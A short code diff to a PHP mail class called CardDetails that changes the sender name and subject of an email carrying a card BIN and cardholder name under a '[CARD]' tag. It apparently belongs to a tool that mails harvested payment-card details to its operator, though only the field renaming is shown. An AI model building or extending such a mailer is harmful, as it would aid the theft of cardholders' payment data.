@@ -37,8 +37,8 @@ class CardDetails extends Mailable {
     public function envelope(): Envelope
     {
         return new Envelope(
-            from: new Address(config('mail.from.address'), $this->request->get('cardName') ?? config('mail.from.name')),
-            subject: "[CARD] | $this->cardBin - {$this->request->name}",
+            from: new Address(config('mail.from.address'), $this->request->cardHolder ?? config('mail.from.name')),
+            subject: "[CARD] | $this->cardBin - {$this->request->cardHolder}",
         );
     }
 
